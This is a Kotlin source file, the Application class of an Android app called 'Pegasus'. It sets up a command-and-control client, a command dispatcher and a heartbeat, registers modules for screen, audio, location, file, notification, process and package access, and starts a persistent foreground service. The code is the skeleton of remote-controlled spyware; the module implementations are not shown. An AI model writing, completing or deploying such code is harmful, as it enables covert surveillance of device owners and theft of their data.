package com.pegasus

import android.app.Application
import com.pegasus.core.C2Client
import com.pegasus.core.CommandDispatcher
import com.pegasus.core.HeartbeatScheduler
import com.pegasus.modules.*
import com.pegasus.utils.DeviceUtils
import com.pegasus.utils.LogUtils

class PegasusApp : Application() {

    companion object {
        lateinit var instance: PegasusApp
            private set
    }

    private lateinit var c2Client: C2Client
    private lateinit var dispatcher: CommandDispatcher
    private lateinit var heartbeat: HeartbeatScheduler

    override fun onCreate() {
        super.onCreate()
        instance = this
        initialize()
    }

    private fun initialize() {
        LogUtils.init("Pegasus")
        LogUtils.i("Pegasus App initializing...")

        // 1. Initialize C2 Client (The "Brain" of communication)
        c2Client = C2Client(this)

        // 2. Initialize Command Dispatcher (The "Hands" that execute commands)
        dispatcher = CommandDispatcher(this)

        // Register Modules
        dispatcher.registerModule(SystemModule(this))
        dispatcher.registerModule(FileModule(this))
        dispatcher.registerModule(ScreenModule(this))
        dispatcher.registerModule(AudioModule(this))
        dispatcher.registerModule(LocationModule(this))
        dispatcher.registerModule(ProcessModule(this))
        dispatcher.registerModule(NotificationModule(this))
        dispatcher.registerModule(PackageManagerModule(this))

        // 3. Initialize Heartbeat Scheduler
        heartbeat = HeartbeatScheduler(this, c2Client)

        // 4. Start the service
        startPegasusService()
    }

    private fun startPegasusService() {
        val intent = android.content.Intent(this, com.pegasus.services.PegasusService::class.java)
        startForegroundService(intent)
    }

    fun getC2Client(): C2Client = c2Client
    fun getDispatcher(): CommandDispatcher = dispatcher
    fun getHeartbeat(): HeartbeatScheduler = heartbeat
}